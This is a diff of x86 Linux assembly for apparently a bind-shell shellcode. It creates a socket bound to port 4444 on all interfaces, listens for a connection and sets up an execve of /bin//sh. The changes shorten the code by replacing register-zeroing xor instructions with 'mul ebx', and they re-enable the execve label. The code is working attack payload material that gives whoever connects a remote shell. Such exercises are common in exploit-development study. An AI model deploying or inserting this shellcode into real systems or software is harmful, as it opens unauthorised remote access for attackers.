@@ -24,9 +24,8 @@ make_socketfd:
 	; ebx: type of socketcall
 	; ecx: pointer to our argument array
 
-	xor eax, eax
 	xor ebx, ebx
-	xor edx, edx ; zeroing out our register
+	mul ebx ; zeroing out our register
 	mov al, 102 ;syscall number for socketcall is 102
 	mov bl, 1 ;socketcall type is 1: sys_socket
 
@@ -49,9 +48,8 @@ call_sysbind:
 	;bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
 	;bind(sockfd, [AF_INET,4444, INADDR_ANY], 16)
 
-	xor eax, eax
 	xor ebx, ebx
-	xor edx, edx
+	mul ebx
 	mov al, 102 ;this is our socketcall syscall again - 102
 	mov bl, 2 ;socketcall type is bind - 2
 
@@ -72,8 +70,9 @@ call_sysbind:
 call_listen:
 	;listen for incoming connection
 	;listen(sockfd, 0)
-	xor eax, eax
+	
 	xor ebx, ebx
+	mul ebx
 	mov al, 102 ;our trusty socketcall again
 	mov bl, 4 ; sys_listen is 4
 
@@ -123,7 +122,7 @@ loop:
 	jns loop
 
 
-;call_execve:
+call_execve:
 
 	;stack needs to look like
 	;ADDR0x0000/bin//sh0x00000
